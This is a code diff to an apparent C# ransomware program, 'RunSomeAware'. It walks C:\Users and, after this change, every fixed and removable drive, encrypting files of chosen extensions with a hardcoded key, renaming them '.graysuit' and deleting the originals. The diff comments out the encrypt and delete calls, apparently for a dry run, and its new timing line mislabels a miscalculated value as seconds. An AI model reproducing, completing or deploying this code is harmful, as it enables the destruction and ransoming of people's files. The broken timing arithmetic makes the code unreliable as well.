@@ -9,18 +9,29 @@ class RunSomeAware
 {
     public static string key = "MyPrivateKey";
     public static string CrypterExt = ".graysuit";
-    public static string ParentDirectory = @"C:\Users\";
     public static string[] AllowedExt = { ".png", ".html", ".7z", ".cpp", ".js", ".txt", CrypterExt };
     public static Mode mode = Mode.Encrypt;
-
-    public static long BytesRead = 0;
-    public enum Mode {Encrypt=1,Decrypt=0 };
+    public enum Mode 
+	{
+		Encrypt=1,
+		Decrypt=0 
+	};
     public static void Main()
     {
-        Stopwatch watch = Stopwatch.StartNew();
-        Start(ParentDirectory);
+		Stopwatch watch = Stopwatch.StartNew();
+        foreach (DriveInfo drive in DriveInfo.GetDrives())
+        {
+            if(drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable)
+			{
+				if(!drive.Name.StartsWith("C:\\"))
+				{
+				    Start(drive.Name); 
+				}
+			}
+        }   
+		Start(@"C:\Users\");		
         watch.Stop();
-        Console.WriteLine("Speed:" + (BytesRead / (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024)) + " MB/s");
+        Console.WriteLine("Time:" + (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024) + " s");
     }
     static void Start(string ParentDir)
     {
@@ -28,9 +39,8 @@ class RunSomeAware
         {
             if (Contain(new FileInfo(file).Extension, AllowedExt))
             {
-                Crypt(file, mode);
-                BytesRead += new FileInfo(file).Length;
-                File.Delete(file);
+                //Crypt(file, mode);
+                //File.Delete(file);
                 Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
             }
         }
